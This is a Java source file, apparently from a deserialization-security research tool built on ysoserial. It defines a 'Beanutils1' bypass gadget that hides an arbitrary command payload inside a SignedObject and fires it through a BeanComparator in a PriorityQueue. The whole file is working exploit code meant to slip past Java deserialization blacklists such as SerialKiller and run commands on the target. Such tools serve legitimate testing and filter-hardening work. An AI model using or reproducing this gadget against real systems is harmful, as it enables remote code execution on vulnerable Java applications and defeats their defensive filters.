package serialkiller.bypass;

import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.ObjectPayload;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import serialkiller.util.Serializables;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.Signature;
import java.security.SignedObject;
import java.util.PriorityQueue;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "commons-beanutils:commons-beanutils:1.0"} )
public class Beanutils1 implements BypassGadget {

    public Object wrapPayload(String command, Class payload_class) throws Exception {

        Object payload = ((ObjectPayload) payload_class.getConstructor().newInstance()).getObject(command);
        byte[] payload_bytes = Serializables.serialize(payload);
        Signature signature = Signature.getInstance("SHA1withDSA");
        PrivateKey privateKey = KeyPairGenerator.getInstance("DSA", "SUN").genKeyPair().getPrivate();
        SignedObject signedObject = new SignedObject("", privateKey, signature);
        Reflections.setFieldValue(signedObject, "content", payload_bytes);

        BeanComparator<Object> comparator = new BeanComparator<Object>("lowestSetBit");
        Reflections.setFieldValue(comparator, "property", "object");

        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {signedObject, signedObject};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;

    }

    public boolean bypassXStream() { return false; }
    public boolean skipTest() { return false; }
}
